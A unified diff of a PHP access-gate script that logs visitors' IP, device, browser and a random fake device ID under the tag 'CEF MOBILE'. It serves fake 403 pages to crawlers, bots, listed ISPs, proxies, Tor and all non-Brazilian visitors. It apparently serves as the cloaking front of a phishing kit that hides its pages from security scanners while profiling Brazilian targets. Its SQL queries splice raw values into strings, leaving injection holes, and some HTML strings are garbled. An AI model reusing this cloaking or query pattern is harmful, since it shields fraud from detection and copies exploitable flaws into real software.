@@ -3,11 +3,11 @@ session_start();
 error_reporting(0);
 date_default_timezone_set('America/Sao_Paulo');
 header("Access-Control-Allow-Origin: *");
-require_once 'function.php';
-require_once '../../db.php';
-require_once '../../libraries/device_detector/autoload.php';
-require_once '../../libraries/mobile_detect/autoload.php';
-require_once '../../libraries/crawler_detect/autoload.php';
+require_once 'funcoes.php';
+require_once 'db.php';
+require_once 'libraries/device_detector/autoload.php';
+require_once 'libraries/mobile_detect/autoload.php';
+require_once 'libraries/crawler_detect/autoload.php';
 
 use DeviceDetector\DeviceDetector;
 use DeviceDetector\Parser\Device\AbstractDeviceParser;
@@ -27,10 +27,20 @@ $dd = new DeviceDetector($userAgent);
 $dd->parse();
 $browser = $dd->getClient('name');
 $osInfo = $dd->getOs('name');
+$version = $dd->getOs('version');
 $device = $dd->getDeviceName();
 $brand = $dd->getBrandName();
 $model = $dd->getModel();
 $sistema = $osInfo . ' - ' . $device . ' - ' . $brand . ' - ' . $model;
+
+
+$dispositivo1 = mt_rand(0, 9);
+$dispositivo2 = mt_rand(0, 9);
+$dispositivo3 = mt_rand(0, 9);
+$dispositivo4 = mt_rand(0, 9);
+$dispositivo5 = mt_rand(10, 99);
+$dispositivo6 = mt_rand(10000, 99999);
+$dispositivo = '' . $dispositivo1 . 'AB' . $dispositivo2 . 'E' . $dispositivo3 . 'B' . $dispositivo4 . '|' . $dispositivo5 . 'D' . $dispositivo6 . '';
 /***********************************Configurações************************************************/
 
 if (isset($_SESSION['COUNTRY_CODE']) || isset($_SESSION['HOST']) || isset($_SESSION['PROXY']) || isset($_SESSION['TOR'])) {
@@ -38,7 +48,7 @@ if (isset($_SESSION['COUNTRY_CODE']) || isset($_SESSION['HOST']) || isset($_SESS
     $getisp = getIsp($ip);
 }
 
-$sql = "select count(id) as contagem, max(acessos) + 1 as contagem_acesso from acessos where ip = '$ip'";
+$sql = "select count(id) as contagem, max(acessos) + 1 as contagem_acesso from Carneiro.dbo.acessos where ip = '$ip'";
 $result = $db->query($sql)->fetchAll(PDO::FETCH_ASSOC);
 
 if ($result[0]['contagem'] > 0) {
@@ -46,24 +56,55 @@ if ($result[0]['contagem'] > 0) {
     $update = "update acessos set acessos = '$acesso' where ip = '$ip'";
     $exec = $db->query($update);
 } else {
-    $insert = "insert into acessos values 
-            (
-                '$datetime', 
-                '$ip', 
-                '" . $_SESSION['COUNTRY_CODE'] . "', 
-                '', 
-                '', 
-                '$sistema', 
-                '$browser', 
-                '', 
-                '" . $_SESSION['HOST'] . "', 
-                '', 
-                '', 
-                '1', 
-                'CEF MOBILE',
-                '$ip')";
+    $insert = "
+    INSERT INTO [dbo].[acessos]
+        ([data]
+        ,[ip]
+        ,[pais]
+        ,[cidade]
+        ,[estado]
+        ,[sistema]
+        ,[navegador]
+        ,[status]
+        ,[hostname]
+        ,[hostname2]
+        ,[user_agent]
+        ,[acessos]
+        ,[tipo]
+        ,[ip_pasta]
+        ,[model]
+        ,[brand]
+        ,[device]
+        ,[version]
+        ,[dispositivo]
+        )
+        VALUES
+        (
+        '$datetime',
+        '$ip',
+        '" . $_SESSION['COUNTRY_CODE'] . "',
+        '',
+        '',
+        '$sistema',
+        '$browser',
+        '',
+        '" . $_SESSION['HOST'] . "',
+        '',
+        '$userAgent', 
+        '1', 
+        'CEF MOBILE', 
+        '$ip', 
+        '$model',
+        '$brand',
+        '$device',
+        '$version',
+        '$dispositivo'
+        )";
     $exec_insert = $db->query($insert);
 }
+
+
+
 
 /***********************************BlackList************************************************/
 /*
@@ -72,6 +113,7 @@ $checklist = new IpBlockList();
 foreach ($ips as $ip) {
     $result = $checklist->ipPass($ip);
     if (!$result) {
+        update_status($ip, 'BlackList');
         header('HTTP/1.0 403 Forbidden');
         die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbisssdden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
         exit();
@@ -91,8 +133,7 @@ if ($dd->isBot()) {
 /***********************************CrawlerDetect********************************************/
 $CrawlerDetect = new CrawlerDetect;
 if ($CrawlerDetect->isCrawler() == true && $_SESSION['COUNTRY_CODE'] !== 'BR') {
-    $update = "update acessos set status = 'Bloqueio CrawlerDetect', hostname = 'Bloqueio CrawlerDetect' where ip = '$ip'";
-    $exec = $db->query($update);
+    update_status($ip, 'Crawler Detect');
     header('HTTP/1.0 403 Forbidden');
     die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
     exit();
@@ -100,8 +141,7 @@ if ($CrawlerDetect->isCrawler() == true && $_SESSION['COUNTRY_CODE'] !== 'BR') {
 
 // Pass a user agent as a string
 if ($CrawlerDetect->isCrawler('Mozilla/5.0 (compatible; Sosospider/2.0; +http://help.soso.com/webspider.htm)') == false) {
-    $update = "update acessos set status = 'Bloqueio CrawlerDetect', hostname = 'Bloqueio CrawlerDetect' where ip = '$ip'";
-    $exec = $db->query($update);
+    update_status($ip, 'Crawler Detect');
     header('HTTP/1.0 403 Forbidden');
     die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
     exit();
@@ -112,12 +152,14 @@ if (
     $userAgent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)" ||
     $userAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)"
 ) {
+    update_status($ip, 'User Agent');
     header('HTTP/1.0 403 Forbidden');
     die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
     exit();
 }
 
 if ($userAgent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)") {
+    update_status($ip, 'User Agent');
     header('HTTP/1.0 403 Forbidden');
     die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
     exit();
@@ -265,6 +307,7 @@ $blocked_words = array(
 
 foreach ($blocked_words as $word2) {
     if (substr_count($dp, strtolower($word2)) > 0 or $dp == "" or $dp == " " or $dp == "    ") {
+        update_status($ip, 'Strtolower');
         header('HTTP/1.0 403 Forbidden');
         die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
         exit();
@@ -388,7 +431,7 @@ $blocked_words = array(
 
 foreach ($blocked_words as $word) {
     if (substr_count($hostname, $word) > 0) {
-
+        update_status($ip, 'Gethostbyaddr');
         header('HTTP/1.0 403 Forbidden');
         die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
         exit();
@@ -896,6 +939,7 @@ $Bot = array(
 
 foreach ($Bot as $BotType) {
     if (stripos($_SERVER['HTTP_USER_AGENT'], $BotType) !== false) {
+        update_status($ip, 'Bot');
         header('HTTP/1.0 403 Forbidden');
         die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
         exit();
@@ -1255,8 +1299,7 @@ $banned_isp = array(
 
 foreach ($banned_isp as $isps) {
     if (substr_count($ispnya, $isps) > 0) {
-        $update = "update acessos set status = 'Bloqueio Isp' where ip = '$ip'";
-        $exec = $db->query($update);
+        update_status($ip, 'Isp');
         header('HTTP/1.0 403 Forbidden');
         die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
         exit();
@@ -1265,23 +1308,20 @@ foreach ($banned_isp as $isps) {
 /***********************************Block Isp********************************************/
 /***********************************Bloqueio País, Vpn, Proxy, Tor********************************************/
 if ($_SESSION['COUNTRY_CODE'] !== 'BR') {
-    $update = "update acessos set status = 'Bloqueio País' where ip = '$ip'";
-    $exec = $db->query($update);
+    update_status($ip, 'País');
     header('HTTP/1.0 403 Forbidden');
     die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>XMRthis server.</p></body></html>');
     exit();
 }
 if ($_SESSION['PROXY'] == 'true') {
-    $update = "update acessos set status = 'Bloqueio Proxy' where ip = '$ip'";
-    $exec = $db->query($update);
+    update_status($ip, 'Proxy');
     header('HTTP/1.0 403 Forbidden');
     die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>XMRthis server.</p></body></html>');
     exit();
 }
 
 if ($_SESSION['TOR'] == 'true') {
-    $update = "update acessos set status = 'Bloqueio Tor' where ip = '$ip'";
-    $exec = $db->query($update);
+    update_status($ip, 'Tor');
     header('HTTP/1.0 403 Forbidden');
     die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>XMRthis server.</p></body></html>');
     exit();
@@ -1289,11 +1329,13 @@ if ($_SESSION['TOR'] == 'true') {
 /***********************************Bloqueio País, Vpn, Proxy, Tor********************************************/
 
 /***********************************Mobile Detect************************************************/
+
 function dispositivo()
 {
     $detect = new Mobile_Detect;
     $detect->isMobile();
     if ($detect->isMobile()) {
+
         return 'mobile';
         exit;
     } else {
